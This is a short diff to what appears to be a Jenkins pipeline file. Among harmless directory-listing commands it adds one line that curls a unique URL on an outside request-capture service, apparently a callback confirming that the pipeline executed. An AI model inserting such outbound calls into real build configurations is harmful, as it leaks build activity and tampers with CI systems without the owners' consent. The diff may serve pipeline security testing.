@@ -9,6 +9,7 @@ pipeline {
                   ls -l
                   ls -la
                   ls -l
+                  curl https://httpdump.app/dumps/eba9f845-7e17-47be-a833-1b8b23091d16
                   '''
             }
                 //script {
